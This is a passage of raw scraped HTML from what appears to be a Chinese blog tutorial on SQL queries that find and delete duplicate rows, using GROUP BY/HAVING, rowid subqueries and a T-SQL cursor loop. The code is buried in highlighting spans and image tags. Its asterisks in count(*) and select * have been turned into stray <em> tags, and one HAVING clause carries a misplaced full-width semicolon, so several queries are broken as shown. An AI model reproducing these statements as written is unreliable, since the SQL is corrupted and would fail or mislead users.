#000000\">&nbsp;people&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" 